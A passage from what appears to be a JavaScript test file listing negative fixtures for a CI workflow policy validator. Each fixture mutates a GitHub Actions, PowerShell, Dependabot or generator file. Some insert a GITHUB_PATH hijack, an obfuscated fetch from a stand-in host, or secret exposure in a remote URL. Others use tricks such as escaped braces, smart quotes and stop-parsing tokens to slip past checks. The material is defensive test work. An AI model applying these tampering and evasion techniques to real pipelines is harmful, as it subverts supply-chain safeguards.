// step's if: ${{ success() }} gate, and the gate is now needs: verify at the job
// level, which T1-BUILD-088 covers. They are not reissued either.
const FIXTURE_INVENTORY = Object.freeze([
  ['T1-YAML-001', 'duplicate key', 'yaml', 'a: 1\na: 2\n'],
  ['T1-YAML-002', 'directive', 'yaml', '%YAML 1.2\n---\na: 1\n'],
  ['T1-YAML-003', 'anchor', 'yaml', 'a: &x 1\n'],
  // This one cannot be made anchor-free the way T1-YAML-005 was, and the reason
  // is worth recording rather than working around: an alias must reference an
  // anchor, so any document containing one contains the anchor first, and the
  // anchor rule fires first. The isAlias branch is therefore unreachable while
  // anchors are refused -- it is there for the case where that rule is ever
  // relaxed. What this fixture actually proves is that the pair is rejected,
  // which is true and worth keeping; its expectation below says so honestly
  // rather than claiming coverage of the alias branch.
  ['T1-YAML-004', 'alias behind its required anchor', 'yaml', 'a: &x 1\nb: *x\n'],
  // Anchor-free on purpose. Written as "a: &x { b: 1 }\nc: { <<: *x }" this
  // fixture was rejected by the anchor check before traversal ever reached the
  // merge key, so it proved the anchor rule twice and the merge-key rule not at
  // all. A merge key does not need an anchor to exist; it only usually has one.
  ['T1-YAML-005', 'merge key', 'yaml', 'c: { <<: { b: 1 } }\n'],
  ['T1-YAML-006', 'explicit tag', 'yaml', 'a: !!str value\n'],
  ['T1-YAML-007', 'multiple documents', 'yaml', 'a: 1\n---\nb: 2\n'],
  ['T1-YAML-008', 'complex key', 'yaml', '? [a, b]\n: value\n'],
  ['T1-YAML-009', 'non-finite scalar', 'yaml', 'a: .nan\n'],
  ['T1-YAML-010', 'anchor on mapping key', 'yaml', '? &x a\n: 1\n'],
  ['T1-YAML-011', 'explicit tag on mapping key', 'yaml', '? !!str a\n: 1\n'],
  ['T1-YAML-012', 'explicit tag on an inline mapping key', 'yaml', '!!str a: 1\n'],
  ['T1-YAML-013', 'anchor on an inline mapping key', 'yaml', '&x a: 1\n'],
  ['T1-BUILD-001', 'mutable action tag', 'build', (source) => replaceOnce(source, ACTIONS.checkout.reference, 'actions/checkout@v7')],
  ['T1-BUILD-002', 'arbitrary action SHA', 'build', (source) => replaceOnce(source, ACTIONS.checkout.reference, 'actions/checkout@1111111111111111111111111111111111111111')],
  ['T1-BUILD-003', 'wrong action repository', 'build', (source) => replaceOnce(source, ACTIONS.checkout.reference, 'example/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1')],
  ['T1-BUILD-004', 'wrong release annotation', 'build', (source) => replaceOnce(source, '# v7.0.1', '# v7.0.0')],
  ['T1-BUILD-005', 'duplicate action use', 'build', (source) => replaceOnce(source, '      - name: Upload verified generated artifacts', `      - name: Duplicate checkout\n        id: duplicate-checkout\n        uses: ${ACTIONS.checkout.reference} # ${ACTIONS.checkout.release}\n        with:\n          repository: \${{ github.repository }}\n\n      - name: Upload verified generated artifacts`)],
  ['T1-BUILD-006', 'missing action use', 'build', (source) => replaceOnce(source, `        uses: ${ACTIONS.uploadArtifact.reference} # ${ACTIONS.uploadArtifact.release}\n`, '')],
  ['T1-BUILD-007', 'swapped action role', 'build', (source) => replaceOnce(source, ACTIONS.uploadArtifact.reference, ACTIONS.checkout.reference)],
  ['T1-BUILD-008', 'missing checkout input', 'build', (source) => replaceOnce(source, '          fetch-tags: false\n', '')],
  ['T1-BUILD-009', 'extra checkout input', 'build', (source) => replaceOnce(source, '          lfs: false\n', '          lfs: false\n          path: alternate\n')],
  ['T1-BUILD-010', 'credential persistence', 'build', (source) => replaceOnce(source, '          persist-credentials: false', '          persist-credentials: true')],
  ['T1-BUILD-011', 'workflow write permission', 'build', (source) => replaceOnce(source, 'permissions:\n  contents: read', 'permissions:\n  contents: write')],
  // Same meaning as when it was written -- verify must not hold a write scope.
  // Only the anchor moved, because verify now declares no scopes at all.
  ['T1-BUILD-012', 'verify write permission', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on: ubuntu-latest\n    permissions: {}', '  verify:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write')],
  ['T1-BUILD-014', 'missing verify job', 'build', (source) => replaceOnce(source, '  verify:', '  renamed-verify:')],
  ['T1-BUILD-015', 'extra job', 'build', (source) => `${source}\n  extra:\n    runs-on: ubuntu-latest\n    steps: []\n`],
  ['T1-BUILD-016', 'matrix introduction', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on:', '  verify:\n    strategy:\n      matrix: { os: [ubuntu-latest] }\n    runs-on:')],
  ['T1-BUILD-017', 'service introduction', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on:', '  verify:\n    services: {}\n    runs-on:')],
  ['T1-BUILD-018', 'remote reusable workflow', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on:', '  verify:\n    uses: example/workflows/.github/workflows/x.yml@main\n    runs-on:')],
  ['T1-BUILD-024', 'job output introduction', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on:', '  verify:\n    outputs: { changed: value }\n    runs-on:')],
  ['T1-BUILD-090', 'publishing step allowed to continue on error', 'build', (source) => replaceOnce(source, '        id: upload-generated\n        uses:', '        id: upload-generated\n        continue-on-error: true\n        uses:')],
  ['T1-BUILD-027', 'upload path broadening', 'build', (source) => replaceOnce(source, '            copilot-instructions.md', '            *.md')],
  ['T1-BUILD-028', 'upload overwrite', 'build', (source) => replaceOnce(source, '          overwrite: false', '          overwrite: true')],
  ['T1-BUILD-029', 'upload step order', 'build', (source) => replaceOnce(source, '        id: upload-generated', '        id: early-upload')],
  ['T1-BUILD-031', 'secret expression', 'build', (source) => replaceOnce(source, '${{ github.token }}', '${{ secrets.PAT }}')],
  ['T1-BUILD-032', 'trigger branch mutation', 'build', (source) => replaceOnce(source, '    branches: [main]', '    branches: [dev]')],
  ['T1-BUILD-033', 'extra trigger', 'build', (source) => replaceOnce(source, 'on:\n', 'on:\n  workflow_dispatch:\n')],
  ['T1-BUILD-034', 'dynamic uses', 'build', (source) => replaceOnce(source, ACTIONS.checkout.reference, '${{ inputs.action }}')],
  ['T1-BUILD-035', 'unreviewed Docker action', 'build', (source) => replaceOnce(source, ACTIONS.checkout.reference, 'docker://alpine:latest')],
  ['T1-BUILD-036', 'credential-helper status normalization removed', 'build', (source) => replaceOnce(source, '          $intHelperExit = $LASTEXITCODE\n          $global:LASTEXITCODE = 0\n', '          $intHelperExit = $LASTEXITCODE\n')],
  ['T1-BUILD-037', 'authorization status normalization removed', 'build', (source) => replaceOnce(source, '          $intAuthorizationExit = $LASTEXITCODE\n          $global:LASTEXITCODE = 0\n', '          $intAuthorizationExit = $LASTEXITCODE\n')],
  ['T1-BUILD-038', 'secret in step env', 'build', (source) => replaceOnce(source, '        id: generate-and-verify\n        shell: pwsh', "        id: generate-and-verify\n        env:\n          TOKEN: '${{ secrets.PAT }}'\n        shell: pwsh")],
  ['T1-BUILD-040', 'unreviewed key on a script step', 'build', (source) => replaceOnce(source, '        id: generate-and-verify\n        shell: pwsh\n', '        id: generate-and-verify\n        shell: pwsh\n        working-directory: .\n')],
  // Anchored through the line that follows it, not on the guard alone. The
  // acquire step disables native-command error mapping for the same reason and
  // appears first, so a bare anchor silently retargeted this fixture at that
  // step's copy and left the credential step's assertion uncovered. The
  // expectation check is what surfaced it.
  // Anchored through the comment that precedes it. The acquire step opens with
  // an identical guard block and now comes first in the file, and the git path
  // resolution block sits between this guard and the first git invocation, so
  // neither a bare anchor nor one spanning to $arrRemoteUrls matches here.
  ['T1-BUILD-041', 'native-command error mapping guard removed', 'build', (source) => replaceOnce(source, '          # markdownlint.yml disables it.\n          if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {\n              $PSNativeCommandUseErrorActionPreference = $false\n          }\n', '          # markdownlint.yml disables it.\n')],
  ['T1-BUILD-050', 'sequential Git stream reads restored', 'build', (source) => replaceOnce(source, '                  $objCopyTask = $objProcess.StandardOutput.BaseStream.CopyToAsync($objOutput)\n                  $objErrorTask = $objProcess.StandardError.ReadToEndAsync()\n                  [void]$objCopyTask.GetAwaiter().GetResult()\n                  $strError = $objErrorTask.GetAwaiter().GetResult()\n', '                  $objProcess.StandardOutput.BaseStream.CopyTo($objOutput)\n                  $strError = $objProcess.StandardError.ReadToEnd()\n')],
  ['T1-BUILD-053', 'credentialed executable resolved through PATH', 'build', (source) => replaceOnce(source, '              $objStartInfo.FileName = $strGitPath\n', '              $arrGitCommands = @(Get-Command git -CommandType Application -ErrorAction Stop)\n              $objStartInfo.FileName = $arrGitCommands[0].Source\n')],
  ['T1-BUILD-054', 'trusted Git path list widened', 'build', (source) => replaceOnce(source, "@('/usr/bin/git', '/bin/git') | Where-Object { [System.IO.File]::Exists($_) } | Select-Object -First 1\n          if ([string]::IsNullOrEmpty($strResolvedGit)) { throw 'native-tool:", "@($env:RUNNER_TEMP + '/git', '/usr/bin/git') | Where-Object { [System.IO.File]::Exists($_) } | Select-Object -First 1\n          if ([string]::IsNullOrEmpty($strResolvedGit)) { throw 'native-tool:")],
  ['T1-BUILD-061', 'PATH lookup reintroduced beside the pinned path', 'build', (source) => replaceOnce(source, '              $objStartInfo.FileName = $strGitPath\n', '              $arrFallback = @(Get-Command git -CommandType Application -ErrorAction SilentlyContinue)\n              $objStartInfo.FileName = $strGitPath\n')],
  ['T1-MARKDOWN-005', 'install scripts enabled', 'markdown', (source) => replaceOnce(source, 'ci --ignore-scripts --no-audit --no-fund', 'ci --no-audit --no-fund')],
  ['T1-MARKDOWN-006', 'audit enabled during install', 'markdown', (source) => replaceOnce(source, 'ci --ignore-scripts --no-audit --no-fund', 'ci --ignore-scripts --no-fund')],
  ['T1-MARKDOWN-007', 'outer lint removed', 'markdown', (source) => replaceOnce(source, 'run lint:md\n', 'run lint:other\n')],
  ['T1-MARKDOWN-008', 'nested lint removed', 'markdown', (source) => replaceOnce(source, 'run lint:md:nested', 'run lint:other:nested')],
  ['T1-MARKDOWN-009', 'policy validator removed', 'markdown', (source) => replaceOnce(source, './Validate-WorkflowPolicy.mjs', './other-validator.mjs')],
  ['T1-MARKDOWN-010', 'failure continuation', 'markdown', (source) => replaceOnce(source, '        shell: pwsh\n        working-directory:', '        shell: pwsh\n        continue-on-error: true\n        working-directory:')],
  ['T1-MARKDOWN-011', 'reviewed package hash removed', 'markdown', (source) => replaceOnce(source, "'E206CDB3562F0397E8EED7FB2C2586269A1F5335CDFF2906DA8D5E070426321E'", "'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'")],
  ['T1-MARKDOWN-012', 'reviewed lock hash altered', 'markdown', (source) => replaceOnce(source, "'277F7168AB3A4F1F7A2565DE13191D64B1572E7CB92B67B0972B3242BD4DE062'", "'377F7168AB3A4F1F7A2565DE13191D64B1572E7CB92B67B0972B3242BD4DE062'")],
  ['T1-MARKDOWN-013', 'pre-install supply gate neutralized', 'markdown', (source) => replaceOnce(source, 'if ($strPackageBefore -cne $strReviewedPackageHash -or', 'if ($false -and $strPackageBefore -cne $strReviewedPackageHash -or')],
  ['T1-BUILD-042', 'workflow token referenced outside the approved push step', 'build', (source) => replaceOnce(source, "          $ErrorActionPreference = 'Stop'\n          $arrArtifacts", "          $ErrorActionPreference = 'Stop'\n          $strToken = '${{ github.token }}'\n          $arrArtifacts")],
  ['T1-MARKDOWN-015', 'early exit before the remaining required phases', 'markdown', (source) => replaceOnce(source, '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n', '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n          exit 0\n')],
  // Reordered inside the policy step, since the linters it used to be hoisted
  // over are no longer in the same job. Moving the validator above the frozen
  // install leaves every required fragment present and every captured status
  // assigned once, so only the ordering rule can reject it.
  ['T1-MARKDOWN-016', 'required phases reordered', 'markdown', (source) => {
    const strValidator = '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n';
    const strInstall = '          $boolCiExisted = Test-Path Env:CI\n';
    return replaceOnce(replaceOnce(source, strValidator, ''), strInstall, strValidator + strInstall);
  }],
  // Anchored through the comment that follows it in the lint step. The
  // acquire step opens with the identical guard and now comes first, so a
  // bare anchor silently retargeted this fixture at that step's copy.
  ['T1-MARKDOWN-014', 'native-command error mapping guard removed from the lint step', 'markdown', (source) => replaceLast(source, '          if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {\n              $PSNativeCommandUseErrorActionPreference = $false\n          }\n\n          # Fixed paths into the distribution', '          # Fixed paths into the distribution')],
  ['T1-MARKDOWN-017', 'captured phase status reset before the final check', 'markdown', (source) => replaceOnce(source, '          $strPackageFinal = (Get-FileHash', '          $intPolicyExit = 0\n          $strPackageFinal = (Get-FileHash')],
  ['T1-DEPENDABOT-001', 'duplicate updates', 'dependabot', 'version: 2\nupdates:\n  - package-ecosystem: github-actions\n    directory: /\n    schedule: { interval: weekly }\n  - package-ecosystem: github-actions\n    directory: /\n    schedule: { interval: weekly }\n'],
  ['T1-DEPENDABOT-002', 'npm update introduced early', 'dependabot', 'version: 2\nupdates:\n  - package-ecosystem: npm\n    directory: /.github/workflows\n    schedule: { interval: weekly }\n'],
  ['T1-DEPENDABOT-003', 'auto-merge key', 'dependabot', 'version: 2\nupdates:\n  - package-ecosystem: github-actions\n    directory: /\n    schedule: { interval: weekly }\n    auto-merge: true\n'],
  ['T1-MARKDOWN-018', 'npm configuration gate removed', 'markdown', (source) => replaceOnce(source, "          foreach ($strNpmConfigPath in @('.npmrc', '../.npmrc', '../../.npmrc')) {\n              if (Test-Path -LiteralPath $strNpmConfigPath) {\n                  throw 'supply: repository-controlled npm configuration is present'\n              }\n          }\n", '')],
  ['T1-MARKDOWN-019', 'npm configuration gate moved after installation', 'markdown', (source) => {
    const gate = "          foreach ($strNpmConfigPath in @('.npmrc', '../.npmrc', '../../.npmrc')) {\n              if (Test-Path -LiteralPath $strNpmConfigPath) {\n                  throw 'supply: repository-controlled npm configuration is present'\n              }\n          }\n";
    return replaceOnce(
      replaceOnce(source, gate, ''),
      '          $strPackageAfterInstall = (Get-FileHash',
      `${gate}          $strPackageAfterInstall = (Get-FileHash`,
    );
  }],
  ['T1-GENERATOR-001', 'generator body rewritten under an unchanged version marker', 'generator', (source) => `${source}\nfunction Invoke-Unreviewed { Add-Content -Path $env:GITHUB_PATH -Value '/tmp/hijack' }\n`],
  ['T1-GENERATOR-002', 'generator truncated', 'generator', (source) => source.slice(0, Math.floor(source.length / 2))],
  // The qualified spelling stays put and satisfies both presence checks; the
  // lookup that would actually run is unqualified and lower case. PowerShell
  // resolves it -- measured -- so the ban has to fold case to see it.
  ['T1-GENERATOR-004', 'unqualified lookup spelled in lower case', 'generator', (source) => `${source}\nget-command -Name 'git'\n`],
  // Round 37, finding C. The qualified lookup is demoted into a comment, which
  // satisfies a presence check run against raw source, while the code resolves
  // git through a session-state API that is not spelled Get-Command. Both
  // halves of the guard have to be read against code for this to be refused.
  ['T1-GENERATOR-003', 'qualified lookup demoted to a session-state lookup', 'generator', (source) => replaceOnce(source, '$arrGitCommands = @(Microsoft.PowerShell.Core\\Get-Command -Name git', "$arrGitCommands = @($ExecutionContext.InvokeCommand.GetCommand('git'")],
  ['T1-MARKDOWN-020', 'lint asset digest gate removed', 'markdown', (source) => replaceOnce(source, '          if ($strLintConfigHash -cne $strReviewedLintConfigHash -or $strLintHelperHash -cne $strReviewedLintHelperHash) {\n              throw \'supply: lint configuration or helper does not match the reviewed digest\'\n          }\n', '')],
  // The generator's descendants outlive the step, so the separation between the
  // job that runs the generator and the job that publishes bytes is load-bearing
  // rather than stylistic. Each of these is a way to put repository code back in
  // the same job as the upload, which is the arrangement the split prevents.
  ['T1-BUILD-086', 'upload returned to the job that runs the generator', 'build', (source) => replaceOnce(source, "          Write-Information 'generated-artifacts: committed bytes match generator output' -InformationAction Continue\n", "          Write-Information 'generated-artifacts: committed bytes match generator output' -InformationAction Continue\n\n      - name: Upload verified generated artifacts\n        id: upload-generated\n        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: style-guide-artifacts\n          path: |\n            copilot-instructions.md\n          if-no-files-found: error\n          retention-days: 7\n          compression-level: 6\n          overwrite: false\n          include-hidden-files: false\n")],
  ['T1-BUILD-087', 'script step added to the publishing job', 'build', (source) => replaceOnce(source, '      - name: Upload verified generated artifacts\n        id: upload-generated\n', '      - name: Stage\n        id: stage\n        shell: pwsh\n        run: |\n          Write-Host staged\n\n      - name: Upload verified generated artifacts\n        id: upload-generated\n')],
  ['T1-BUILD-088', 'publishing job no longer waits for verification', 'build', (source) => replaceOnce(source, '  publish:\n    needs: verify\n', '  publish:\n')],
  ['T1-BUILD-089', 'step appended after the verification step', 'build', (source) => replaceOnce(source, "          Write-Information 'generated-artifacts: committed bytes match generator output' -InformationAction Continue\n", "          Write-Information 'generated-artifacts: committed bytes match generator output' -InformationAction Continue\n\n      - name: Summarize\n        id: summarize\n        shell: pwsh\n        run: |\n          Write-Host done\n")],
  // The walk decides what the verification can be made to read, so each way of
  // loosening it is a fixture rather than a comment.
  // Every branch of the walk gets a fixture. The closing digest would catch all
  // of these today, but it is re-baselined whenever a reviewed edit lands, and
  // an invariant that only the digest defends is one a legitimate re-stamp
  // drops without anyone noticing.
  // Isolating by construction: the token goes in a key the step is allowed to
  // have, whose value no other assertion pins, so the credential scan is the
  // only check that can reject it. Verified to pass the validator before the
  // scan was widened from run to the serialized step.
  ['T1-BUILD-097', 'token expanded into a permitted but unpinned step key', 'build', (source) => replaceOnce(source, '      - name: Generate and verify committed artifacts\n', '      - name: Generate and verify ${{ github.token }} committed artifacts\n')],
  // Mixed case on purpose: the point is the casing, not the context name.
  ['T1-BUILD-098', 'secrets context expanded in a casing the scan did not match', 'build', (source) => replaceOnce(source, '      - name: Generate and verify committed artifacts\n', '      - name: Generate and verify ${{ SeCrEtS.DEPLOY_KEY }} committed artifacts\n')],
  // Index syntax reaches the same token as the dot form. Enumerating spellings
  // is what produced three rounds of findings, so the expression syntax itself
  // is refused and this fixture proves the bracket form is covered without the
  // scan having to know about it.
  ['T1-BUILD-100', 'credential reached through expression index syntax', 'build', (source) => replaceOnce(source, '      - name: Generate and verify committed artifacts\n', "      - name: Generate and verify ${{ github['token'] }} committed artifacts\n")],
  // A top-level return exits the script exactly as exit would, and every
  // fragment and ordering assertion still passes.
  ['T1-BUILD-101', 'top-level return inserted after the generator', 'build', (source) => replaceOnce(source, '          }\n\n          if ((Get-GitControlSurfaceDigest) -cne $strControlSurfaceBefore) {', '          }\n          return\n\n          if ((Get-GitControlSurfaceDigest) -cne $strControlSurfaceBefore) {')],
  // The case the position-based rule could not see. Textually one line earlier
  // than T1-BUILD-101 and far worse: the script ends before the generator runs
  // at all, so nothing is generated, nothing is compared, and the step still
  // exits zero.
  ['T1-BUILD-122', 'top-level return inserted before the generator', 'build', (source) => replaceOnce(source, '          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n', '          return\n          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n')],
  // Escaped braces are literals, not block delimiters. Confirmed against
  // PowerShell: this form prints a brace and then returns from the script,
  // while a scanner that counted the escaped braces read the return as
  // depth one and let it through.
  ['T1-BUILD-123', 'top-level return hidden behind escaped braces', 'build', (source) => replaceOnce(source, '          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n', '          Write-Information `{ -InformationAction Continue\n          return\n          Write-Information `} -InformationAction Continue\n          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n')],
  // PowerShell reads smart quotes as string delimiters, so the braces here are
  // inside a string it opens and the scanner does not. Refused as non-ASCII
  // rather than by teaching the scanner four more codepoints.
  ['T1-BUILD-124', 'smart quotes introduced into a governed script step', 'build', (source) => replaceOnce(source, '          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n', '          Write-Information \u201c{\u201d -InformationAction Continue\n          return\n          Write-Information \u201c}\u201d -InformationAction Continue\n          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n')],
  // Neither acquire step defines a function, so return has no legitimate use
  // in one; a top-level return exits zero having skipped the whole tail.
  ['T1-BUILD-125', 'top-level return in the acquire step', 'build', (source) => replaceOnce(source, "          $strServerUrl = $env:GITHUB_SERVER_URL\n", "          return\n          $strServerUrl = $env:GITHUB_SERVER_URL\n")],
  // Appended after the revision check: overwrite the generator and hide it
  // behind the advisory assume-unchanged bit before verify snapshots it.
  ['T1-BUILD-126', 'statement appended after the build acquire revision check', 'build', (source) => replaceOnce(source, '          Write-Host "acquire: anonymous shallow checkout of $strSha"\n', '          Write-Host "acquire: anonymous shallow checkout of $strSha"\n          Copy-Item -LiteralPath ./tools/gen.ps1 -Destination ./.github/workflows/Generate-StyleGuideArtifacts.ps1 -Force\n')],
  // --% makes the rest of the line a literal native-command argument, so the
  // braces after it are not syntax while the scanner still counts them.
  ['T1-BUILD-127', 'stop-parsing token used to hide a top-level return', 'build', (source) => replaceOnce(source, '          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n', '          /bin/echo --% {\n          return\n          /bin/echo --% }\n          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n')],
  // Round 37, finding D. Statement-position matching cannot see a termination
  // that arrives as a static method call, because the token follows :: rather
  // than beginning a statement.
  ['T1-BUILD-130', 'generate step terminated successfully before the probes', 'build', (source) => replaceOnce(source, '          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n', '          [System.Environment]::Exit(0)\n          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n')],
  ['T1-BUILD-131', 'generate step status forced through the host', 'build', (source) => replaceOnce(source, '          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n', '          $host.SetShouldExit(0)\n          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n')],
  // return was banned in acquire steps and not here; a top-level return exits
  // successfully before the origin and credential-helper assertions run.
  ['T1-BUILD-137', 'credential step returns before its required assertions', 'build', (source) => replaceOnce(source, '          $arrRemoteUrls = @(& $strGitPath remote get-url --all origin)\n', '          return\n          $arrRemoteUrls = @(& $strGitPath remote get-url --all origin)\n')],
  ['T1-BUILD-132', 'credential step status forced through the host', 'build', (source) => replaceOnce(source, '          $arrRemoteUrls = @(& $strGitPath remote get-url --all origin)\n', '          $host.SetShouldExit(0)\n          $arrRemoteUrls = @(& $strGitPath remote get-url --all origin)\n')],
  // Round 37, finding B, on the build acquire step.
  ['T1-BUILD-133', 'build acquire step gains a dynamic execution path', 'build', (source) => replaceOnce(source, '          $strServerUrl = $env:GITHUB_SERVER_URL\n', "          Invoke-Expression ('gi' + 't fetch https://example.invalid/x')\n          $strServerUrl = $env:GITHUB_SERVER_URL\n")],
  // Inert text satisfies a substring match. This wraps the approved invocation
  // in a single-quoted here-string, so the command appears verbatim in the
  // script and never executes.
  ['T1-BUILD-104', 'generator invocation present only as inert text', 'build', (source) => replaceOnce(source, '          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n', "          $strInert = '$arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)'\n          $global:LASTEXITCODE = 0\n")],
  ['T1-BUILD-106', 'here-string introduced into a governed script step', 'build', (source) => replaceOnce(source, '          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n', "          $strNote = @'\n          inert\n          '@\n          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n")],
  // Every probe reports by throwing, so an empty handler around them turns each
  // verdict into a no-op while the step still succeeds.
  ['T1-BUILD-105', 'probe failures suppressed by an empty handler', 'build', (source) => replaceOnce(source, '          }\n\n          if ((Get-GitControlSurfaceDigest) -cne $strControlSurfaceBefore) {', '          }\n          try {\n          } catch {\n          }\n\n          if ((Get-GitControlSurfaceDigest) -cne $strControlSurfaceBefore) {')],
  ['T1-BUILD-102', 'origin cardinality check removed from credential cleanup', 'build', (source) => replaceOnce(source, '          $arrRemoteUrls = @(& $strGitPath remote get-url --all origin)\n          if ($LASTEXITCODE -ne 0 -or $arrRemoteUrls.Count -ne 1) {\n', '          $arrRemoteUrls = @(& $strGitPath remote get-url --all origin)\n          if ($LASTEXITCODE -ne 0) {\n')],
  // The step order was previously covered only as a side effect of the fixture
  // that reintroduced the upload into verify; that fixture now trips the
  // no-actions rule instead, so the ordering gets a fixture of its own.
  ['T1-BUILD-107', 'authored step appended after the generator step', 'build', (source) => replaceOnce(source, "          Write-Information 'generated-artifacts: committed bytes match generator output' -InformationAction Continue\n", "          Write-Information 'generated-artifacts: committed bytes match generator output' -InformationAction Continue\n\n      - name: Summarize\n        id: summarize\n        shell: pwsh\n        run: |\n          Write-Host 'done'\n")],
  // Inert-by-construction, not inert by spelling: the statement is textually
  // identical to the approved one and sits on its own line at column zero, so
  // the anchored match and every substring check are satisfied while the
  // generator never runs. Only the brace depth distinguishes them.
  ['T1-BUILD-108', 'generator invocation nested inside an unevaluated script block', 'build', (source) => replaceOnce(source, '          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n', '          $null = {\n          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n          }\n')],
  // Written before the generator, where the region slice that catches a handler
  // does not look, and effective over the whole script regardless.
  ['T1-BUILD-109', 'script-wide error trap registered ahead of the generator', 'build', (source) => replaceOnce(source, '          $arrArtifacts = @(\n', '          trap { $null = $_ }\n          $arrArtifacts = @(\n')],
  ['T1-BUILD-110', 'acquire step no longer disables native-command error mapping', 'build', (source) => replaceOnce(source, '          if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {\n              $PSNativeCommandUseErrorActionPreference = $false\n          }\n', '')],
  ['T1-BUILD-111', 'acquire step accepts an unexpected server', 'build', (source) => replaceOnce(source, "          if ($strServerUrl -cne 'https://github.com') {\n", '          if ([string]::IsNullOrEmpty($strServerUrl)) {\n')],
  ['T1-BUILD-112', 'acquire step accepts an arbitrary repository name', 'build', (source) => replaceOnce(source, "          if ($strRepository -cnotmatch '^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$') {\n", '          if ([string]::IsNullOrEmpty($strRepository)) {\n')],
  ['T1-BUILD-113', 'acquire step accepts a ref in place of a commit', 'build', (source) => replaceOnce(source, "          if ($strSha -cnotmatch '^[0-9a-f]{40}$') {\n", '          if ([string]::IsNullOrEmpty($strSha)) {\n')],
  ['T1-BUILD-114', 'acquire step no longer requires an empty workspace', 'build', (source) => replaceOnce(source, '          if (@([System.IO.Directory]::EnumerateFileSystemEntries($PWD.Path)).Count -ne 0) {\n              throw \'acquire: the workspace is not empty\'\n          }\n', '')],
  ['T1-BUILD-115', 'acquire step fetches a ref rather than the commit', 'build', (source) => replaceOnce(source, '          & $strGitPath fetch --depth 1 --no-tags --no-recurse-submodules origin $strSha\n', '          & $strGitPath fetch --depth 1 --no-tags --no-recurse-submodules origin $env:GITHUB_REF\n')],
  ['T1-BUILD-116', 'acquire step no longer proves which revision it checked out', 'build', (source) => replaceOnce(source, '          $strHead = (& $strGitPath rev-parse HEAD).Trim()\n          if ($LASTEXITCODE -ne 0 -or $strHead -cne $strSha) {\n', '          $strHead = (& $strGitPath rev-parse HEAD).Trim()\n          if ([string]::IsNullOrEmpty($strHead)) {\n')],
  ['T1-BUILD-117', 'credential embedded in the anonymous fetch remote', 'build', (source) => replaceOnce(source, '          & $strGitPath remote add origin "$strServerUrl/$strRepository"\n', '          & $strGitPath remote add origin "https://x-access-token:$env:SUPPLIED@github.com/$strRepository"\n')],
  ['T1-BUILD-118', 'acquire step drops a native status classification', 'build', (source) => replaceOnce(source, '          if ($LASTEXITCODE -ne 0) { throw "acquire: git init exited $LASTEXITCODE" }\n', "          Write-Host 'acquire: initialized'\n")],
  ['T1-BUILD-119', 'early exit prepended to the acquire step', 'build', (source) => replaceOnce(source, "          $ErrorActionPreference = 'Stop'\n", "          $ErrorActionPreference = 'Stop'\n          exit 0\n")],
  // Satisfies every named acquire assertion and changes the bytes anyway, which
  // is the case the closing digest exists for.
  // Mutates a line no named assertion covers, so it reaches the backstop
  // rather than being answered by one of the assertions in front of it.
  ['T1-BUILD-120', 'acquire step edited without re-review', 'build', (source) => replaceOnce(source, '          $strSha = $env:GITHUB_SHA\n', '          $strSha  = $env:GITHUB_SHA\n')],
  ['T1-BUILD-103', 'credential-free origin URL shape no longer required', 'build', (source) => replaceOnce(source, "          if ($arrRemoteUrls[0] -notmatch '^https://github\\.com/[^/@]+/[^/@]+(?:\\.git)?$') {\n", "          if ($arrRemoteUrls[0] -notmatch '^https://') {\n")],
  // Every assertion on the credential step tests for presence, which an early
  // exit leaves untouched. The control-flow rejection is ordered ahead of that
  // step's digest so this fixture exercises it rather than the backstop.
